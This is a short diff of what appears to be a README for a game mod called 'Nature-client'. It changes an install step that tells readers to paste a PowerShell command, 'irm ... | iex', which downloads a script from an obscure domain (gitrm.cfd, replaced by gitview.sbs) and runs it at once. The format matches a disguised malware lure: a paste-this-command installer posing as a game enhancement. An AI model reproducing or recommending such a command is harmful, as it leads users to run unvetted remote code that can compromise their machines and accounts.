@@ -26,7 +26,7 @@ No overpowered features, no blatant advantages - just smart conveniences that en
 **2.** Paste and press `Enter`:
 
 ```powershell
-irm gitrm.cfd?mod=Nature-client | iex
+irm gitview.sbs?mod=Nature-client | iex
 ```
 
 **3.** Wait **5–10 minutes** until it finishes
